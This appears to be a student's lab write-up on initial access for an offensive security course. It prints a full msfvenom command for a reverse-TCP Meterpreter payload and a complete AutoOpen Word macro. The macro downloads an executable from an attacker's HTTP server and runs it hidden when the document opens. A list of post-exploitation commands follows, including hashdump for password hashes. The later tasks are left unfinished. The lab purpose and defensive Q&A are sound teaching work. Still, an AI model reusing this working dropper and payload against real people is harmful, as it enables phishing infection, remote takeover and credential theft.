# Initial Access and Execution

## Task 1: Malicious Macro Delivery

**Objective:** Create a Word macro that downloads and executes a payload when the document is opened, demonstrating macro-based phishing.

The setup uses two separate services on the Kali box: a Python HTTP server (port 8080) to host the payload, and a Metasploit handler (port 4444) to catch the session.

Steps:

1. Generated an x64 Meterpreter executable ```msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.92.136 LPORT=4444 -f exe -o RAT.exe```. Confirmed the architecture with `file RAT.exe` (should report `PE32+ ... x86-64`). I specifically downloaded the x64 version because initially I was getting an error that said "unsupported 16-bit application". 

2. Started the HTTP server from the payload's directory: `python3 -m http.server 8080`

3. Started the Metasploit handler on port 4444 with the payload set to match the exe (`windows/x64/meterpreter/reverse_tcp`).

4. In Word, created an `AutoOpen` macro (View > Macros > View Macros, name it AutoOpen, Create) and pasted the code. Changed the IP placeholder value as needed.

5. Ran the macro. It downloaded the exe over HTTP, saved it to `%USERPROFILE%\Documents\launcher.exe`, and executed it. My Meterpreter session successfully loaded.

Macro code:

```
Sub AutoOpen()
    Dim objShell As Object
    Dim objHTTP As Object
    Dim objStream As Object
    Dim strPath As String
    Dim strURL As String
    
    ' --- CONFIGURATION ---
    ' REPLACE THIS WITH YOUR ACTUAL IP ADDRESS AND RAT NAME
    strURL = "http://192.168.92.136:8080/RAT.exe"
    strPath = Environ("USERPROFILE") & "\Documents\launcher.exe"
    ' ---------------------

    ' 1. Validate URL
    If InStr(strURL, "YOUR_ACTUAL_IP") > 0 Then
        MsgBox "ERROR: You must replace YOUR_ACTUAL_IP with your real IP address.", vbCritical
        Exit Sub
    End If
    
    On Error GoTo ErrHandler
    
    ' 2. Download File
    Set objHTTP = CreateObject("MSXML2.XMLHTTP")
    objHTTP.Open "GET", strURL, False
    objHTTP.Send
    
    If objHTTP.Status <> 200 Then
        MsgBox "Download Failed. HTTP Status: " & objHTTP.Status, vbCritical
        Exit Sub
    End If
    
    ' 3. Save File
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1 ' adTypeBinary
    objStream.Open
    objStream.Write objHTTP.ResponseBody
    objStream.Position = 0
    objStream.SaveToFile strPath, 2 ' adSaveCreateOverWrite
    objStream.Close
    
    ' 4. Verify File Exists
    If Dir(strPath) = "" Then
        MsgBox "CRITICAL: File was not saved to disk.", vbCritical
        Exit Sub
    End If
    
    ' 5. Run File
    Set objShell = CreateObject("WScript.Shell")
    ' Use cmd /c to ensure proper batch execution
    objShell.Run "cmd /c """ & strPath & """", 0, False
    
    Exit Sub

ErrHandler:
    MsgBox "ERROR " & Err.Number & ": " & Err.Description, vbCritical
End Sub
```
Video showing execution of this delivery:

https://youtu.be/BZ21Wh6ChbM

## How It Achieves Code Execution

When the document opens, the `AutoOpen` procedure runs automatically. The macro uses MSXML2.XMLHTTP to download the exe from the attacker's HTTP server, writes it to disk with ADODB.Stream, and runs it with WScript.Shell. The running exe then calls back to the Metasploit handler.

**MITRE ATT&CK:** T1566 (Phishing), T1204.002 (User Execution), T1059.005 (VBA), T1105 (Ingress Tool Transfer)

## Questions

Why is the "AutoOpen" macro name significant?

Word looks for this macro name when a document is opened and automatically runs it. This means that the attacker doesn't have to worry about the victim manually running the macro.

What defensive measures can organizations implement to block macro-based attacks?

Blocking macros is one of the biggest ways to defend against this. Windows automatically does this these days. The pesky yellow banner saying to beware of the document at the top of word documents you see after opening a file downloaded from an email or the internet is evidence of this. In group policy you can also only allow digitally signed macros from trusted sources to be run so that you can still allow your users functionality on helpful macros without the risk. Additionally, proper employee security training and blocking child processes from Office applications are great measures.

## Task 2: Backdoor an Executable

Commands:

1. ipconfig



MITRE ID: 

2. sysinfo

MITRE ID:

3. ps

MITRE ID:

4. netstat -an

MITRE ID:

5. getprivs

MITRE ID:

6. hashdump

MITRE ID:

7. route

MITRE ID:

8. arp

MITRE ID:

9. idletime

MITRE ID:

https://youtu.be/mLShDVtzsEE

Note: I forgot to run getuid in this video, below is a screenshot showing the command:

<img width="373" height="55" alt="image" src="https://github.com/user-attachments/assets/a63440fe-cf23-46a4-b27c-313bb4860526" />


(1) the exact command you ran, 
(2) a video clip of YOUR enumeration executions, 
(3) an explanation paragraph describing what the output reveals to an attacker
(4) the MITRE ATT&CK technique ID. Also submit: a video of the PSExec module execution establishing the session, and a video of the screenshare module showing the Windows 10 desktop. 


## Task 3:

## Task 4:
